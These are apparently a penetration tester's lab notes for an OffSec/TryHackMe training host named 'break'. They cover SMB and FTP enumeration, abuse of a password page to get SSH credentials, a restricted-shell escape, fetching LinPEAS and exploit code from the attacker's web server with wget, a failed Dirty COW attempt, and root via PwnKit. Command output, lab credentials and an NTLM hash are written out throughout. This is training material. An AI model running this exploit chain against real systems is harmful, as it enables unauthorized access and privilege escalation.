---
created_date: 11 September 2023
updated_date: 11 September 2023
type: windows/linux
URL: https://tryhackme.com/room/metasploitintro
---

##### Initial Scanning Notes:
```markdown
21*:
- [X] going to check anonymous login
22:
- probably not a vector
80*:
- []running dirsearc/gobuster/nikto now
- Apache httpd 2.4.18
139:[[chicken_scratch_formatting]]
- never seen anything to do with 139 before, probably not a vector.
445*:
- go through smb checklist
```
Breaking out of a Restricted Shell
```markdown
- https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/
- reference 10.11.1.101 for proper walkthrough
```
[X] ftp check
#ftpanonymouslogin #failed
```shell
# starting with ftp anon logins
┌──(root㉿kali)-[/home/kali]
└─# ftp 10.11.1.101                                                                                         
Connected to 10.11.1.101.
220 (vsFTPd 3.0.3)
Name (10.11.1.101:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

[X] smb checks
#smbclient  #worked
```shell
#smbclient anonymous worked, connecting to individual shares to see whats in them
┌──(root㉿kali)-[/home/kali]
└─# smbclient -L \\\\10.11.1.101 -N
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (break server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	MYGROUP              TOPHAT
	SECURITY             MAILMAN
	SVCORP               SVCLIENT08
	THINC                ALICE
	WORKGROUP            BREAK

# connected to print$ share first
┌──(root㉿kali)-[/home/kali]
└─# smbclient \\\\10.11.1.101\\print$ -N
Try "help" to get a list of possible commands.
smb: \> ls

  W32PPC                              D        0  Thu Mar  3 13:13:29 2016 [X] Nothing
  IA64                                D        0  Thu Mar  3 13:13:29 2016 [X] Nothing
  x64                                 D        0  Thu Mar  3 13:13:29 2016 [X] Nothing
  W32X86                              D        0  Thu Mar  3 13:13:29 2016 [X] Nothing
  W32ALPHA                            D        0  Thu Mar  3 13:13:29 2016 
  W32MIPS                             D        0  Thu Mar  3 13:13:29 2016 
  WIN40                               D        0  Thu Mar  3 13:13:29 2016
  COLOR                               D        0  Thu Mar  3 13:13:29 2016
# these are all empty directories with 0 bytes, moving onto next sharedrive

# unable to anonymous connect to IPC$
┌──(root㉿kali)-[/home/kali]
└─# smbclient \\\\10.11.1.101\\IPC$ -N  
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> 
```

#crackmapexec
```shell

#crackmapexec with utilizing ntlm hashes
crackmapexec smb 10.11.1.120 -u Administrator -H 3fee04b01f59a1001a366a7681e95699

# got a windows version and able to connect with the guest user
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.11.1.101 -u 'guest' -p '' --sessions
SMB         10.11.1.101     445    BREAK            [*] Windows 6.1 (name:BREAK) (domain:) (signing:False) (SMBv1:True)
SMB         10.11.1.101     445    BREAK            [+] \guest: 
SMB         10.11.1.101     445    BREAK            [+] Enumerated sessions
 

#crackmapexec anonymous login successful
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.11.1.101 -u '' -p '' --sessions
SMB         10.11.1.101     445    BREAK            [*] Windows 6.1 (name:BREAK) (domain:) (signing:False) (SMBv1:True)
SMB         10.11.1.101     445    BREAK            [+] \: 
SMB         10.11.1.101     445    BREAK            [+] Enumerated sessions

```

#enum4linux
```shell
# got nothing from this.
┌──(root㉿kali)-[/home/kali]
└─# enum4linux -u "guest" -p "" 10.11.1.101
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Mar 31 18:47:46 2023

 =========================================( Target Information )=========================================

Target ........... 10.11.1.101
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.11.1.101 )============================


[+] Got domain/workgroup name: WORKGROUP


 ====================================( Session Check on 10.11.1.101 )====================================


[+] Server 10.11.1.101 allows sessions using username 'guest', password ''


 =================================( Getting domain SID for 10.11.1.101 )=================================

Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] CB 27 2B 5B 20 BE 2D 08   89 A9 34 49 0C DF F4 ED   .'+[ .-. ..4I....
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

[+] Can't determine if host is part of domain or part of a workgroup

enum4linux complete on Fri Mar 31 18:47:47 2023
```

[] Web Browsing Checks 


![[1. website.png]]


![[2. website seceret.png]]

```markdown
- contact us page has years that everyone was born.

Administrator:
Name: Walter
E-mail: walter@oscp.thinc.local
Year of birth: 1982

Developer:
Name: Alfred
E-mail: alfred@oscp.thinc.local
Year of birth: 1988

Web Developer:
Name: Cory
E-mail: cory@oscp.thinc.local
Year of birth: 1985

Writer:
Name: Jasmine
E-mail: jasmine@oscp.thinc.local
Year of birth: 1983
```

![[3. contact us.png]]

![[4. password input.png]]

![[5. alfred credentials.png]]
```markdown
- used the password 1988 to login to alfred @ /passwords
- got alfreds credentials to ssh server.
	- alfred:IHopeThisDoesNotExpire
	- Info: SSH server access.
	- oscp.thinc.local
```

```shell
# ssh'd on as alfred, on with restricted shell
Last login: Fri Mar 31 18:11:00 2023 from 192.168.119.127
alfred@break:~$ whoami
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
alfred@break:~$ lol
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
alfred@break:~$ ?
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
alfred@break:~$ 
```

```markdown
- cant break out of shell using shushant 747's list to check
- going to attempt to set passwords for other users in /passwords to see if i can set their passwords and get into ssh
- able to import files on the password page for users.
```

![[6. Walter Password addition.png]]
```markdown
- attempting to set walter credentials
- walter:password
	- need to try to login with this after following next line.

# following this checklist
- https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/
- COMMAND BELOW WORKED TO BREAK OUT OF RESTRICTED SHELL
- ssh user@IP -t "bash --noprofile"
```

```shell
┌──(root㉿kali)-[/home/kali]
└─# ssh alfred@10.11.1.101 -t "bash --noprofile"
alfred@10.11.1.101's password: 
alfred@break:~$ ls
development  projects  README.txt  usr
alfred@break:~$ whoami
alfred
```

##### Beginning Foothold Checks:
#sudo #failed 
```shell
alfred@break:~/usr/bin$ sudo -l
[sudo] password for alfred: 
Sorry, user alfred may not run sudo on break.
alfred@break:~/usr/bin$ 
```

#cat #/etc/crontab
```shell

alfred@break:~/usr/bin$ cat /etc/crontab
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

#cat #readme.txt
```shell
alfred@break:~$ ls
development  projects  README.txt  usr
alfred@break:~$ cat README.txt
Hello Alfred, 

Since our e-mail server is still under construction because Cory insists on using Docker for some reason, I am going to leave this file here and "hopefully" by the time you read this we will be able to communicate via e-mail. 

I am slowly setting up accounts to the team members that require access to this box, however, keep in mind that this is by no means ready yet. Your shell is restricted so you shouldn't worry about breaking stuff ;). If you notice anything missing from your access just let me know and I will add it to your account. 

Have a great day!
alfred@break:~$ 
```

#uname #-a #kernelprivesc
```shell
alfred@break:~$ uname -a
Linux break 4.4.0-166-generic #195-Ubuntu SMP Tue Oct 1 09:35:25 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

#cat #/etc*/release
```shell
alfred@break:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

```

#lsb_release #-a 
```shell
alfred@break:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial
alfred@break:~$ 

```

Going to try to get LinPEAS on box
#transfered #linpeas
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# ls               
linpeas.sh
                                                                          
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.101 - - [31/Mar/2023 19:51:13] "GET /linpeas.sh HTTP/1.1" 200 -

# pulled over linpeas
alfred@break:/tmp$ wget http://192.168.119.132/linpeas.sh
linpeas.sh                    100%[==============================================>] 808.68K  1.30MB/s    in 0.6s 
```

Linpeas notes:
```markdown
CVEs Check:
Vulnerable to CVE-2021-4034
Potentially Vulnerable to CVE-2022-2588
=======================================================================================
Executing Linux Exploit Suggester:
[+] [CVE-2017-16995] eBPF_verifier 
- highly probable

[+] [CVE-2016-5195] dirtycow & dirtycow2
- highly probable

[+] [CVE-2021-4034] PwnKit
- probable
=======================================================================================
Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:39055         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::139                  :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::445                  :::*                    LISTEN      - 
=======================================================================================
Checking if runc is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it

```
Notes for Priv Esc:
```
- potential privilege escalation
- https://www.exploit-db.com/exploits/44298
- Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation
	- going to look around a bit more into finding CRED offset
if different kernel adjust CRED offset + check kernel stack size
=========================================================================================
- going to try dirty cow first
	- next is pwnkit
- confirmed that gcc is on the box
alfred@break:/tmp$ gcc
gcc: fatal error: no input files
```

#dirty.c #dirtycow #fail
```shell
#dirtycow

alfred@break:/tmp$ wget http://192.168.119.132/dirty.c
--2023-03-31 20:02:52--  http://192.168.119.132/dirty.c
Connecting to 192.168.119.132:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4816 (4.7K) [text/x-csrc]
Saving to: ‘dirty.c’

dirty.c                       100%[==============================================>]   4.70K  --.-KB/s    in 0s      

2023-03-31 20:02:52 (784 MB/s) - ‘dirty.c’ saved [4816/4816]

alfred@break:/tmp$ ls
dirty.c  linpeas.sh  tmux-1000	vmware-root
alfred@break:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
alfred@break:/tmp$ ls
dirty  dirty.c	linpeas.sh  tmux-1000  vmware-root
alfred@break:/tmp$ ls -la
total 872
drwxrwxrwt  9 root   root     4096 Mar 31 20:03 .
drwxr-xr-x 22 root   root     4096 Nov  2  2019 ..
-rwxrwxr-x  1 alfred alfred  14344 Mar 31 20:03 dirty
-rw-rw-r--  1 alfred alfred   4816 Mar 31 20:01 dirty.c
alfred@break:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7f0dd7fe2000
madvise 0


ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
alfred@break:/tmp$ 
alfred@break:/tmp$ su firefart
No passwd entry for user 'firefart'
```

Trying pwnkit:
#pwnkit #success
```shell

alfred@break:/tmp$ wget http://192.168.119.132/PwnKit
PwnKit                        100%[==============================================>]  17.62K  --.-KB/s    in 0.07s   

2023-03-31 20:06:30 (241 KB/s) - ‘PwnKit’ saved [18040/18040]

alfred@break:/tmp$ chmod +x Pwnkit
chmod: cannot access 'Pwnkit': No such file or directory
alfred@break:/tmp$ chmod +x PwnKit
alfred@break:/tmp$ ls -la
total 896
drwxrwxrwt  9 root   root     4096 Mar 31 20:06 .
drwxr-xr-x 22 root   root     4096 Nov  2  2019 ..
-rwxrwxr-x  1 alfred alfred  14344 Mar 31 20:03 dirty
-rw-rw-r--  1 alfred alfred   4816 Mar 31 20:01 dirty.c
drwxrwxrwt  2 root   root     4096 Nov 13 14:56 .font-unix
drwxrwxrwt  2 root   root     4096 Nov 13 14:56 .ICE-unix
-rwxrwxr-x  1 alfred alfred 828087 Mar 31 19:50 linpeas.sh
-rw-rw-r--  1 alfred alfred   1763 Mar 31 20:03 passwd.bak
-rwxrwxr-x  1 alfred alfred  18040 Mar 31 20:06 PwnKit
drwxrwxrwt  2 root   root     4096 Nov 13 14:56 .Test-unix
drwx------  2 alfred alfred   4096 Mar 31 19:51 tmux-1000
drwx------  2 root   root     4096 Nov 13 14:56 vmware-root
drwxrwxrwt  2 root   root     4096 Nov 13 14:56 .X11-unix
drwxrwxrwt  2 root   root     4096 Nov 13 14:56 .XIM-unix
alfred@break:/tmp$ ./PwnKit
root@break:/tmp# whoami
root
root@break:/tmp# 
```

Flag:
#ifconfig #ip #a #cat #proof.txt
```shell
root@break:~# ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:aa:a8:76:4c brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:86:37:c3 brd ff:ff:ff:ff:ff:ff
    inet 10.11.1.101/16 brd 10.11.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe86:37c3/64 scope link 
       valid_lft forever preferred_lft forever
root@break:~# cat proof.txt
93711eeddc98578e3e085c0dc21aa7e2

```





